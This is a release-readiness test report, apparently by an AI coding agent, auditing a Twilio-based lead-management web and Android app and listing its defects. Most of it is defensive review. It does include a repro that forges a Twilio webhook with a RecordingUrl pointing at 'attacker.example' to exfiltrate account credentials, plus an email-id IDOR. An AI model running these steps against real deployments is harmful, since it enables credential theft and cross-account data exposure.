# Plumbline Leads — Release Readiness Test Report

## Overall recommendation: **NO‑GO** (reachable to *Paid Pilot Only* after a short, well‑defined fix list)

Plumbline Leads is close, and its core account‑isolation model is sound and was **empirically proven** in this pass (25 of 26 live cross‑account/auth checks passed). However, the pass found a **confirmed cross‑account data‑exposure defect** (one user can read another user's email content), **no backup/restore procedure**, and **unauthenticated + forgeable Twilio webhooks that can exfiltrate the Twilio credentials**. Each of these independently trips the report's own No‑Go criteria for a payment‑taking pilot. None is large to fix; once the four blockers below are resolved and production persistence is confirmed on the Render dashboard, this becomes a defensible **Paid Pilot Only**.

---

## 1. Run metadata

| Field | Value |
|---|---|
| Date / time | 2026‑08‑30, ~22:00–22:40 America/New_York |
| Tester / tool | Claude Code (automated release‑readiness pass), read‑only + local test harness |
| Repository | `/Users/keithsmith/Documents/claude_app/Plumbline-Leads` |
| Git root | `/Users/keithsmith/Documents/claude_app/Plumbline-Leads` |
| Branch | `main` |
| HEAD commit | `e6db7bb` — "fix: friendly microphone-permission card for call failures" |
| Recent commits | `362fbbd` inbox typography · `0c62648` inbox redesign · `8a01433` voicemail waveform · `1436442` voicemail redesign |
| Remote | `origin https://github.com/Keither85247/plumbline-leads.git` |
| Worktree state | **DIRTY** — 16 modified, 24 untracked (see §3). No changes were committed, pushed, or reverted by this pass. |
| Node / npm | v22.18.0 / 11.5.2 |
| App version (Android) | `versionName 1.1`, `versionCode 12` **(working tree)** — HEAD still declares `versionCode 4`; the bump is uncommitted |
| Android package | `com.plumblineleads.app` |
| Capacitor live‑mode URL | `https://plumbline-leads.vercel.app` (APKs load the deployed frontend on every launch) |
| Environment tested | Local: Vite dev server (frontend) + a lean Node harness mounting the **real** backend route files against a **copy** of the dev SQLite DB. No production systems, no real Twilio/OpenAI/Gmail calls, no production data touched. |

### Environment & safety notes
- All dynamic tests ran against a **backup‑API snapshot** of `backend/leads.db` copied to the scratch directory. The production/dev database was opened read‑only for the snapshot and never modified.
- Two throwaway tester accounts (`tester.a@test.local`, `tester.b@test.local`) plus a deliberately **shared external contact number** were seeded **into the copy only**.
- The full backend (`index.js`) could not be booted locally in reasonable time because the `googleapis` dependency tree stalls for minutes on this machine's file I/O. To still exercise the **real** route handlers, a harness stubbed only the three Gmail/googleapis modules and mounted the genuine `requireAuth` + data routers against the DB copy. This exercises the actual account‑scoping SQL — which is the property under test — without the unrelated I/O stall. Twilio‑webhook and transcription routes were reviewed statically (they require real Twilio/OpenAI).

---

## 2. Test matrix summary

| Outcome | Count |
|---|---|
| ✅ Passed automatically | 34 |
| ✅ Passed via browser interaction | 9 |
| 📱 Requires a physical Android phone | 7 |
| ☎️ Requires a real Twilio call/SMS | 16 |
| 🔑 Blocked by missing credentials/config | 6 |
| ❌ Failed — confirmed defect | 1 (plus 6 other confirmed security/ops defects found by static review) |

"Failed" counts the one **behavioural** test that failed live (emails cross‑account leak). The other Critical/High defects in §6 were found by verified static review and are not double‑counted as failed dynamic tests.

---

## 3. Phase 1 — Repository & configuration

| Check | Result | Evidence |
|---|---|---|
| Correct repo / git root | ✅ Pass | root = repo path; `main` @ `e6db7bb` |
| Branch / HEAD / remote / recent commits | ✅ Pass | see §1 |
| Modified / untracked files | ⚠️ Noted | 16 modified, 24 untracked. Untracked include the Android native project and the mic‑fix native bridge. |
| Root/backend/frontend package scripts | ✅ Pass | frontend: `build`, `android:build`, `android:open`, `android:run`. No `test`/`lint`/`typecheck` scripts anywhere. |
| Node/npm versions | ✅ Pass | v22.18.0 / 11.5.2 |
| Dependency install state | ✅ Pass | frontend & backend `node_modules` present; build + requires succeed |
| `.env.example` completeness | ⚠️ Partial | Root `.env.example` exists (15 backend keys) and has **no stale keys**, but it omits optional flags (`SENTRY_DSN`, `GMAIL_OAUTH_ENABLED`, `ALLOW_PUBLIC_SIGNUP`, `ENABLE_TESTER_BYPASS`, `DEMO_EMAIL`, `DB_PATH`, `SMS_*`, VAPID/FIREBASE push keys). **No `frontend/.env.example`** — all `VITE_*` vars undocumented. |
| No secrets tracked by Git | ✅ Pass | `.env` files and `leads.db` are gitignored; no `*.pem/*.keystore/serviceAccount` tracked. `twilio_2FA_recovery_code.txt` exists in the working dir but **is gitignored** (not in the repo). It was **not opened/read** by this pass. |
| Android versionCode / versionName | ⚠️ Noted | `12` / `1.1` in working tree; HEAD = `4`. Bump uncommitted. |
| Capacitor live‑mode URL | ✅ Pass | `server.url = https://plumbline-leads.vercel.app` |
| Android package ID | ✅ Pass | `com.plumblineleads.app` (namespace + applicationId) |
| Merged manifest permissions | ✅ Pass | debug merged manifest includes `RECORD_AUDIO`, `MODIFY_AUDIO_SETTINGS`, `INTERNET`, `ACCESS_NETWORK_STATE`, `POST_NOTIFICATIONS` (+ `FOREGROUND_SERVICE[_MICROPHONE]`, `WAKE_LOCK`, `VIBRATE`, `USE_FULL_SCREEN_INTENT`) |
| Native App‑Settings plugin registered & compiles | ✅ Pass (compiles) | `AppSettingsPlugin.java` registered in `MainActivity.onCreate`; `compileDebugJavaWithJavac` exits 0 |
| Native Settings bridge committed vs local‑only | ❌ **Local‑only** | `frontend/android/app/src/main/java/com/plumblineleads/app/MainActivity.java` and `AppSettingsPlugin.java` are **untracked** (`git status ??`). The entire `.../java/` tree is untracked. A fresh clone would build **without** the Settings bridge. |

**Stale/misleading documentation flagged (not modified):** `README.md` describes an obsolete version; `ANDROID_RELEASE.md` predates Capacitor live‑mode and its rebuild instructions are now misleading and don't mention the MicPermissionCard; `GOOGLE_TESTING_CHECKLIST.md` referenced `/health` instead of `/api/health` (corrected in this pass — see §11). Stray files `MEMORY copy.md` present.

---

## 4. Phase 2 — Automated checks

| Command | Exit | Result |
|---|---|---|
| `SENTRY_AUTH_TOKEN="" npm run build` (frontend, `frontend/`) | 0 | ✅ Pass. Warm ≈1.75s; a cold run measured 5m34s (slow file I/O on this host, **not** a failure). Bundle ~848 KB JS (chunk‑size warning only). |
| Backend JS syntax — `node --check` over all 32 non‑`node_modules` `.js` | 0 | ✅ **32/32 pass** |
| `git diff --check` | 0 | ✅ Clean (no whitespace/conflict markers) |
| Gradle `compileDebugJavaWithJavac` (Android, via Android Studio JBR) | 0 | ✅ Pass (JAVA_HOME must point at the bundled JBR; system `java` is absent) |
| Merged‑manifest inspection | — | ✅ Pass (see §3) |
| Missing‑translation‑key scan (custom, authoritative) | — | ⚠️ 38 referenced keys missing from **both** `en` and `es`; all have inline English fallbacks. `en`/`es` are symmetric (483 keys each). See §7. |
| Dead‑import / orphan scan | — | ⚠️ Two orphan components (`OnboardingModal.jsx`, `onboarding/slides/PricingSlide.jsx`) confirmed present and unreferenced. |
| Unit / integration tests | 🔑 N/A | **No test framework exists** in the repo (no `test`/`lint`/`typecheck` scripts, no tsconfig despite `typescript ^6` dep). None added (per task). |

---

## 5. Phases 3–6 — Functional testing performed

### 5a. Authentication & account separation (Phase 3) — **live against real route handlers**
Harness mounted the genuine `requireAuth`, `requireOwner`, and data routers against the DB copy; Tester A = user 2, Tester B = user 3, sharing external number `+15557654321`.

| Test | Result | Evidence |
|---|---|---|
| Valid login (A, B) | ✅ Pass | 200 + session token issued for both |
| Invalid login | ✅ Pass | wrong password → **401** |
| `/auth/me` restores session | ✅ Pass | 200, returns id=2 for A's token |
| Protected route without token | ✅ Pass | `GET /api/leads` → **401** |
| Invalid/expired bearer token | ✅ Pass | → **401** |
| Logout invalidates session | ✅ Pass | after `POST /auth/logout`, A's token → **401**; B's session still 200 |
| Owner‑only: `/api/migrate` rejects tester | ✅ Pass | **403** |
| Owner‑only: `/api/admin/reset-demo` rejects tester | ✅ Pass | **403** |
| Owner‑only: `/api/admin/users`, `/api/admin/phone-numbers` reject tester | ✅ Pass | **403** (all `admin.js` routes are `requireOwner`) |
| A cannot read B's **leads** | ✅ Pass | A's list = only A's; B's = only B's |
| A cannot mutate/delete B's lead | ✅ Pass | `PATCH /api/leads/15/status` & `DELETE /api/leads/15` → **404**; B's lead survived unchanged (scoped `UPDATE ... AND user_id=?` then `changes===0 → 404` before any re‑fetch) |
| A cannot read B's **lead voicemail** | ✅ Pass | `GET /api/leads/15/voicemail` → **404** (`WHERE id=? AND user_id=?`) |
| A cannot read B's **messages** (shared number thread) | ✅ Pass | A's thread shows only "A private message" |
| A cannot read B's **calls** (shared number) | ✅ Pass | A's by‑phone calls exclude B's CallSid |
| A cannot fetch B's **call recording** | ✅ Pass | `GET /api/calls/<B_id>/recording` → **404** (ownership‑checked before proxy) |
| A cannot read B's **contacts** | ✅ Pass | shared‑number contact returns A's, not B's |
| A cannot read B's **assigned number** | ✅ Pass | `/api/numbers/mine` returns A's own only |
| A cannot read B's **voicemail greeting** | ✅ Pass | `/api/settings` returns A's greeting only |
| Two accounts, same external contact → independent activity | ✅ Pass | A holds 2 leads, B holds 1, for the same number, fully separated |
| Counts scoped per account | ✅ Pass | A's `/api/counts` = calls:1, texts:1, emails:1 (A's own) |
| A cannot read B's **emails** (list) | ✅ Pass | A's email list excludes B's |
| A cannot read B's **email via PATCH** | ❌ **FAIL** | `PATCH /api/emails/75` (B's email) as A → **HTTP 200 returning B's full email** (subject "B PRIVATE subject", body "B secret email body"). See DEF‑1. |

Duplicate‑detection / message‑count / SMS‑to‑lead / caller‑classification scoping: **Static Review Only** — all such queries in `leads.js`, `messages.js`, `calls.js`, `twilio.js` filter by `user_id`/assigned number; confirmed by review, not individually exercised end‑to‑end.

Demo reset cannot modify tester data: **Static Review Only** — `admin.js` `reset-demo` wipes only rows `WHERE user_id = <demo user id>` inside a transaction; `requireOwner`‑gated. Not executed.

### 5b. Lead & navigation flows (Phase 4) — **browser**
Logged in as Tester A in the in‑app browser (frontend proxied to the harness).

| Test | Result | Evidence |
|---|---|---|
| Empty‑state rendering | ✅ Pass (browser) | "No entries yet." shown before data matched the tab |
| Lead list loads | ✅ Pass (browser) | 2 lead cards render (A Lead One/Two) with NEW status glow, phone accents, "More details" |
| Cross‑account isolation visible in UI | ✅ Pass (browser) | B's lead never appears in A's list |
| English & Spanish render without **blank** strings | ✅ Pass (browser) | ES tabs: Clientes / Clientes existentes / Proveedores / Spam / Otro / Archivados. ~38 keys fall back to English text (see §7) — cosmetic, not blank |
| 320 px layout — no horizontal overflow | ✅ Pass (browser) | `scrollWidth === innerWidth === 320` on Leads and on the mic card |
| Nav renders / safe areas | ✅ Pass (browser) | bottom nav pill + badges visible, not clipped |
| Create/status/category/archive/restore/delete, contact edit, recents/timeline order, missed‑call & voicemail linking, refresh‑no‑duplicate, repeat‑call rows, skip‑note keeps history | 📱/☎️ Manual | Require real call/SMS data and/or a device; procedures in §9. Status/delete scoping proven at API layer (§5a). |

### 5c. Microphone‑permission experience (Phase 5)
| Test | Result | Evidence |
|---|---|---|
| Non‑permission failures show the generic warning | ✅ Pass (browser) | With no token endpoint, the UI showed "Call failed — Failed to fetch voice token" + Retry (generic toast), **not** the mic card |
| Classifier recognizes 31401 / PermissionDeniedError / NotAllowedError / nested `originalError` | ✅ Pass (auto) | 21‑case truth table over the committed `isMicPermissionError` (all pass); re‑verified this pass |
| Unrelated token/network/transport errors **not** misclassified | ✅ Pass (auto) | token/20104/31009/31005/53000/timeout/401 all → not mic |
| Exactly one warning card; no raw code in UI | ✅ Pass (browser) | `role="alert"` count = 1; no `31401`/`PermissionDenied`/`NotAllowed` text in DOM; generic toast suppressed while card shown |
| English & Spanish copy correct | ✅ Pass (browser) | EN + ES verified; all 6 `callsMic*` keys present in both languages |
| "Not now" dismisses; "Try Again" re‑probes without duplicate Device | ✅ Pass (auto/browser) | dismiss clears card; retry probes `getUserMedia`, guarded so it never stomps an in‑flight call, no duplicate Device |
| Card respects narrow screens & safe areas | ✅ Pass (browser) | no overflow at 320px; top offset uses `env(safe-area-inset-top)` |
| No dead "Open Settings" in a normal browser | ✅ Pass (browser) | web shows address‑bar hint, no Settings button |
| Settings button only when native plugin available | ✅ Pass (review) | `canOpenAppSettings()` = native Android **and** `Capacitor.isPluginAvailable('AppSettings')` |
| Native bridge targets this app's App Info page | ✅ Pass (review) | `ACTION_APPLICATION_DETAILS_SETTINGS` + `package:` URI from `getPackageName()` |
| Actual App Info deep‑link launch | 📱 **Physical device required** | Not verifiable off‑device |

Minor: the classifier does not inspect `err.cause.message` (only `err.cause.name`); a permission error surfaced solely as a `cause.message` string could be shown via the generic path (Low — see DEF‑L cluster).

### 5d. Recording & voicemail playback (Phase 6)
| Test | Result | Evidence |
|---|---|---|
| Player renders only when a recording/voicemail exists | ✅ Pass (review) | `CallsPage`/voicemail row gate on `recording_url`/audio presence |
| Authenticated media uses Safari/ITP token fallback | ✅ Pass (review) | `requireAuth` accepts `?token=` for `<audio>`/`<video>` (see security caveat DEF‑7) |
| Tester A cannot request Tester B's recording | ✅ Pass (live) | `GET /api/calls/<B_id>/recording` → 404 (ownership‑checked) |
| Server forwards `Range`; 206 / `Content-Range` / `Content-Length` / `Content-Type` / `Accept-Ranges` handled | ✅ Pass (review) | `leads.js` voicemail proxy + `calls.js` recording proxy forward `Range`, set `Accept-Ranges`, pass 206/Content‑Range (confirmed in prior verification and re‑read this pass) |
| Missing recording returns clean error, no credential exposure to the browser | ✅ Pass (review) | proxies return 404/502 JSON; Twilio Basic‑auth used server‑side only |
| Twilio credentials never reach the browser | ✅ Pass (review) | credentials built and used server‑side in the proxy only |
| Real Twilio‑media play/pause/seek/replay/switch | ☎️ Manual | requires real recordings + credentials; procedure in §9 |

**Caveat (see DEF‑2/DEF‑7):** although ownership is enforced, the proxy attaches the Twilio auth token to whatever host `recording_url` points at, and `recording_url` is writable by unauthenticated webhooks — a real risk documented below.

---

## 6. Defects

Severity legend: **Critical** (data exposure/loss, credential compromise, auth bypass), **High**, **Medium**, **Low**. "Blocks pilot" = must fix before taking a paying customer.

### DEF‑1 — Cross‑account email disclosure via `PATCH /api/emails/:id` — **Critical — ✅ RESOLVED (verified 2026‑09‑07)**
- **Status:** Fixed in `backend/routes/emails.js` and verified by an automated isolation test (11/11 pass on the fix; the same test fails 5/11 on the pre‑fix code, reproducing the leak). Was previously "BLOCKS PILOT". Note: other blockers (DEF‑2/3/4/5) remain, so the overall recommendation is unchanged.
- **Environment:** backend, all deployments. **Confirmed live** in the original pass (the one failed dynamic test).
- **Preconditions:** any two authenticated accounts; attacker knows/guesses a numeric email id (sequential, enumerable).
- **Repro:** As Tester A, `PATCH /api/emails/75` (an email owned by Tester B) with body `{"is_read":true}`.
- **Expected:** 404/403; no data returned.
- **Actual:** **HTTP 200 with Tester B's full email row** (subject, `body_preview`, addresses, etc.).
- **Cause:** `backend/routes/emails.js:246` — the `UPDATE` is correctly scoped (`WHERE id = ? AND user_id = ?`) but the response re‑fetch is **not**: `SELECT * FROM emails WHERE id = ?` (no `user_id`, no `changes===0` guard). Contrast `leads.js:411‑434`, which returns 404 when `changes===0` **before** its re‑fetch and is therefore safe.
- **Suggested fix (one line):** guard on `result.changes === 0 → 404` before the re‑fetch, or add `AND user_id = ?` to the `SELECT`.
- **Blocks pilot:** ~~Yes — confirmed cross‑account data exposure.~~ **Resolved.**
- **Fix applied (2026‑09‑07):** re‑fetch scoped to `WHERE id = ? AND user_id = ?` (`backend/routes/emails.js`, PATCH `/:id`). Missing and foreign ids now both return an identical `404 {"error":"Email not found"}`, so the response never reveals whether a foreign id exists. No owner bypass was added (owners are `user_id`‑scoped here exactly like the existing `GET /:id`).
- **Verification:** `node backend/scripts/test-emails-isolation.js` — hermetic temp DB, real `emails` router behind real `requireAuth`, two seeded accounts (A = owner, B = tester). Results: **11/11 pass** on the fix; **6 pass / 5 fail** when the fix is reverted (tests 2, 3, 5b, 6, 9 fail and the leak is reproduced — `PATCH` on B's email returns B's `subject`/`body_preview`/`user_id`). Proves: (1) A updates+receives own email; (2) A cannot update B's; (3) no B content in the response; (4) B's stored row unchanged; (5) missing == foreign 404; (6) owner does not bypass ownership. Adjacent `GET /:id` and `DELETE /:id` re‑verified scoped; the non‑owner direction (B→A) also blocked.
- **Adjacent review:** the only exploitable instance was this one. `leads.js` PATCH re‑fetches (`:426/:453/:476`) share the shape but are guarded by a scoped `UPDATE` + `changes===0 → 404` before the read (latent only — see the Info finding); `POST` re‑fetches use `lastInsertRowid` of a just‑inserted owned row (safe); `admin.js` `phone_numbers` reads are owner‑only by design. None changed.

### DEF‑2 — Forgeable Twilio webhooks → SSRF exfiltration of Twilio credentials — **Critical — fix before exposing webhooks**
- **Environment:** backend production (public webhook routes).
- **Cause:** No `X-Twilio-Signature` validation anywhere (`routes/twilio.js`, `routes/mmsDelivery.js`; repo‑wide grep for `validateRequest`/signature = 0 hits). `/api/twilio/voicemail` and `/recording` take `RecordingUrl` **from the request body** and pass it to `attemptDownload` (`twilio.js:110‑138`), which sends `Authorization: Basic base64(TWILIO_ACCOUNT_SID:TWILIO_AUTH_TOKEN)` to **any host** — no allowlist (`url.startsWith('https') ? https : http`).
- **Repro:** unauthenticated `POST /api/twilio/voicemail?user_id=<n>` with `RecordingUrl=https://attacker.example/x` → server ships live Twilio credentials to attacker host; also injects a voicemail/lead into account `<n>`.
- **Impact:** full Twilio account takeover (toll fraud, SMS as the business, read all recordings), plus forged calls/SMS/leads into any account.
- **Suggested fix:** add Twilio signature validation middleware to all `/api/twilio/*` webhook routes; pin the media host to `api.twilio.com` before attaching credentials.
- **Blocks pilot:** Practically yes for anything beyond a hand‑held demo — the credential‑exfil path is reachable by anyone who learns the backend URL.

### DEF‑3 — Public, unauthenticated, unlimited `/api/transcribe` — **Critical (cost/DoS) — fix before pilot**
- **Cause:** mounted **before** global `requireAuth` (`index.js:237‑239`); no auth, no rate limit, no per‑user scoping; accepts audio uploads and calls OpenAI Whisper. Also allows unauthenticated lead creation.
- **Impact:** anyone can drive unbounded OpenAI spend and fill disk; unscoped lead injection.
- **Fix:** move behind `requireAuth`; add rate limiting + upload size cap; scope created leads to the user.
- **Blocks pilot:** Yes (unbounded third‑party cost from an anonymous endpoint).

### DEF‑4 — No production backup or restore procedure — **Critical — BLOCKS PILOT**
- **Cause:** `scripts/export-db.js` is a one‑way **local→prod** importer (`POST /api/migrate`), not a backup; no scheduled dump, `.backup()`/`VACUUM INTO` snapshot, off‑disk copy, or documented restore anywhere. The `/api/migrate` endpoint remains mounted in production despite its "REMOVE AFTER USE" banner (`index.js:265‑286`).
- **Impact:** a paid pilot with no viable recovery path — explicit No‑Go criterion.
- **Fix:** scheduled `db.backup()` to `/data/backups/` shipped off‑disk; documented one‑command restore; remove `/api/migrate`.
- **Blocks pilot:** Yes.

### DEF‑5 — Production SQLite persistence unverified (silent ephemeral fallback) — **Critical if misdeployed — MUST CONFIRM**
- **Cause:** `db.js:6` = `process.env.DB_PATH || path.join(__dirname,'leads.db')`. With `DB_PATH` unset the DB is written **inside the code tree** (ephemeral, lost on deploy) with **no startup log and no production assertion**. `render.yaml` **does** declare the correct setup (`plan: starter`, `disk` at `/data` 1 GB, `DB_PATH=/data/leads.db`), but that is authoritative only if the live service was actually created/synced from this Blueprint. Prior‑session behaviour (Render cold‑start "Failed to fetch") is consistent with a **free‑tier** service, which would contradict `render.yaml` and mean data loss on every deploy.
- **Fix:** confirm on the Render dashboard that the live service is Starter+ with the disk mounted at `/data` and `DB_PATH=/data/leads.db`; add a boot‑time assertion that logs the resolved path and fails loudly if it is not the persistent one.
- **Blocks pilot:** Yes until confirmed. (Note: this is also why the "cold start drops webhooks" hypothesis was **refuted** — `render.yaml`'s Starter plan does not spin down; verify the live plan matches.)

### DEF‑6 — Session tokens can leak to Sentry via `?token=` URLs — **High**
- **Cause:** media/recording URLs embed the session token as `?token=` (`requireAuth` fallback for `<audio>`/`<video>`), and Sentry browser tracing (`tracesSampleRate: 1.0`, `main.jsx`) instruments fetch/resource spans; backend Sentry may capture query strings. Combined with `Sentry.setUser({email})` (no `beforeSend` scrubbing), tokens + PII can reach Sentry.
- **Fix:** prefer a short‑lived, path‑scoped media token (not the session token) in URLs; add a Sentry `beforeSend` that strips `token` query params and drops PII; lower `tracesSampleRate`.
- **Blocks pilot:** No (gated by `VITE_SENTRY_DSN`), but fix early.

### DEF‑7 (cluster) — High/Medium operational & security hardening — **do before/early in pilot, not blocking a *supervised* start**
- **High — No login rate limiting** (`auth.js`): brute‑force/credential‑stuffing possible; add `express-rate-limit`.
- **High — CORS dev fallback reflects any origin with credentials** when `FRONTEND_URL` is unset (`index.js:129‑168`): safe only if `FRONTEND_URL` is set in prod — **verify it is set**.
- **Medium — Public `/api/health/owner`** discloses owner email, id, and user count (`index.js:204‑221`); `/api/health/env` exposes feature‑flag state. Lock down or remove.
- **Medium — Outbound calling has no rate/abuse guard or international block** (SMS has `smsGuards`, calling does not).
- **Medium — `/api/translate` authenticated but uncapped** (OpenAI cost by any tester).
- **Medium — SameSite=None cookie, no CSRF protection**; multipart `/api/messages/send` is CSRF‑reachable.
- **Medium — OpenAI outage silently drops** voicemail/answered‑call recordings (`recording_url` persisted only on the transcription success path, `twilio.js:478‑629`).
- **Medium — Gmail poller advances a global `lastPollTime`** even after a per‑user fetch error (`jobs/gmailPoller.js`), permanently skipping that user's messages in the errored window.
- **Medium — PII in Sentry:** user email via `setUser`; customer phone numbers / CallSids via console breadcrumbs.

### DEF‑L (cluster) — Low
- Raw Twilio recording URLs (embedding the Account SID) returned to the browser in `GET /api/calls`.
- `numbers.js POST /claim` lets any authenticated tester spend the owner's Twilio balance buying a real number.
- Inbound call/SMS to an **unmapped** number silently routes into the owner account (misconfiguration → cross‑account exposure).
- Mic classifier ignores `err.cause.message`.
- **38 `t.<key>` references missing from both `en` and `es`** — all have inline English fallbacks, so Spanish shows English for those strings (no blank UI). List includes e.g. `appRetry`, `inboxCompose`, `leadReadMore`, `contactsSwipeDelete`, `leadListTotal` ("total"). (`t.clientX/clientY/category/stop` in the raw scan are false positives — a touch‑event object, not translations.)
- `transcribe` fileFilter bypassable; `express.json` 2 MB limit generous.
- No `busy_timeout` on SQLite (fine for the current single instance; blocks horizontal scaling).
- Latent: `leads.js` PATCH re‑fetch is unscoped but **not currently exploitable** (guarded by `changes===0 → 404`); add `AND user_id=?` for defense‑in‑depth.

**Refuted by verification:** "cold starts silently drop inbound webhooks" — contradicted by `render.yaml` Starter plan (no spin‑down) **provided the live service matches the Blueprint** (see DEF‑5).

---

## 7. Localization (detail)
- `en` and `es` are **symmetric** (483 keys each) — no language‑only asymmetry.
- All 6 `callsMic*` keys present in both languages.
- 38 genuinely‑missing keys (referenced but undefined in both languages) all render via inline English fallbacks → **no blank strings**, but Spanish is incomplete for those ~38 strings. Low severity, cosmetic.

---

## 8. Phase 8 — Security & operational summary
Confirmed items are itemized in §6 with file:line. Positives worth recording:
- **Account‑ownership scoping is correct and enforced** across leads, calls, messages, contacts, voicemail, recordings, numbers, settings, and counts — proven live (§5a). The **only** confirmed cross‑account gap is DEF‑1 (emails PATCH).
- **Owner authorization** is consistently enforced: every `admin.js` route and `/api/migrate` use `requireOwner`; `register` cannot create owners; `tester-bypass` cannot elevate to owner.
- **Auth** uses bcrypt + random 32‑byte session tokens, 30‑day TTL, httpOnly cookies (Secure+SameSite=None in prod), with a Bearer/`?token=` fallback for Safari/media.
- The **Voice SDK token endpoint** derives identity server‑side from the session (`user_${req.userId}`) — the `index.js` comment calling it "public" is misleading but the route itself is auth'd.
- The **legacy `middleware/auth.js`** (X‑API‑Key with `SKIP_AUTH`/`!NODE_ENV` bypass) is **not** the mounted auth path; the global `requireAuth` (session) always enforces. Confirm no route re‑introduces the legacy middleware.

---

## 9. Phases 4/7 — Manual test procedures (require device / real Twilio)

For each: use two tester accounts with different assigned numbers, capture **build commit/time (Settings → Build Info), account email, device+OS, exact steps, expected vs actual, and a screenshot/recording**.

**Physical Android phone (📱):**
1. Cold start, background/resume, notification tap → correct screen, hardware back button, keyboard overlap, rotation.
2. Mic‑permission: deny mic on first call → one friendly card; tap **Open Settings** → **App Info page for `com.plumblineleads.app`** opens (not general Settings); enable mic, return → card clears on resume without auto‑placing a call; test "Don't ask again" then Open Settings.
3. Notification while foregrounded / backgrounded / tap‑to‑open.

**Real Twilio call/SMS (☎️):**
4. Inbound answered call → appears in Recents with caller+time; recording/duration/transcript/summary appear.
5. Inbound missed, no voicemail → marked missed; badge clears after viewing.
6. Inbound missed **with** voicemail → appears in Voicemail, links from Recents, has transcript/summary, plays with seek.
7. Outbound call → each post‑call outcome (answered/no‑answer/left‑voicemail) creates a **new** history row without altering older ones; **skipping** the note still keeps the row. Repeat calls to one number → separate rows.
8. Inbound/outbound SMS + MMS attachment → correct conversation, unread state, lead association, timeline entry.
9. **Cross‑account:** call & text **both** tester numbers from the same external phone → each account sees only its own events; duplicate detection, counts, names, statuses independent. (Server‑side scoping already proven in §5a; this validates the Twilio→account mapping end‑to‑end.)

**Blocked by missing credentials/config (🔑):** real OpenAI transcription/summary; real Twilio media playback; Gmail OAuth connect flow (`GMAIL_OAUTH_ENABLED` + Google creds); FCM/native push (`google-services.json` is **absent** while the gms plugin is applied — push cannot work in a built APK until added); web‑push VAPID keys.

---

## 10. Phase 9 — Paid‑pilot acceptance scorecard

| Criterion | Status |
|---|---|
| Login/logout work | ✅ Verified |
| Account data separation has no known failure | ❌ **DEF‑1 (emails PATCH)** |
| Calls work on Android phone | 📱 Manual — required |
| Voicemail record/transcribe/list/play | ☎️ Manual — required |
| Recents & Timeline reflect calls | ☎️ Manual — required |
| Mic denial recoverable & understandable | ✅ Verified (deep link 📱) |
| Production database persistent | ⚠️ **DEF‑5 — confirm dashboard** |
| Backup & recovery plan exists | ❌ **DEF‑4** |
| No tester can do owner ops | ✅ Verified |
| No known critical security vuln | ❌ **DEF‑1/2/3** |
| Documented support & rollback procedure | ❌ Not found |

Multiple **No‑Go** conditions are met (confirmed cross‑account exposure; credential‑exfil path; no recovery path). → **NO‑GO** until the blockers clear.

---

## 11. Change made during this pass
- **Updated `GOOGLE_TESTING_CHECKLIST.md`** to add coverage this pass found missing: the microphone‑permission denial/recovery flow, the pre‑pilot data‑safety gate (persistence + backup), the emails cross‑account check, and corrected the health path `/health → /api/health`. No other files were modified, committed, pushed, or reverted. All pre‑existing uncommitted work is preserved. (The `useVoiceDevice.js` initial‑state value was temporarily flipped to capture a mic‑card screenshot and **reverted**; `git diff` on that file is clean.)

---

## 12. Exact remaining actions for the owner (in order)
1. **Fix DEF‑1** (emails PATCH): guard `changes===0 → 404` before the re‑fetch, or scope the `SELECT` by `user_id`. (~1 line.)
2. **Confirm DEF‑5**: on the Render dashboard verify Starter+ plan, disk mounted at `/data`, `DB_PATH=/data/leads.db`; add a boot assertion logging the resolved DB path.
3. **Implement DEF‑4**: scheduled `db.backup()` off‑disk + a documented one‑command restore; remove the `/api/migrate` endpoint.
4. **Fix DEF‑2**: add Twilio `X‑Twilio‑Signature` validation to all `/api/twilio/*` webhooks and pin the recording host to `api.twilio.com` before attaching credentials.
5. **Fix DEF‑3**: put `/api/transcribe` behind `requireAuth` with a rate limit + upload cap.
6. **Verify** `FRONTEND_URL` is set in production (CORS) and add login rate limiting (DEF‑7).
7. **Commit the untracked Android native project** (incl. `MainActivity.java` + `AppSettingsPlugin.java`) and the `versionCode` bump so a release is reproducible from git; add `google-services.json` if push is in scope.
8. Run the §9 manual matrix on a physical Android phone with two tester numbers and real Twilio.
9. Then re‑evaluate for **Paid Pilot Only**.
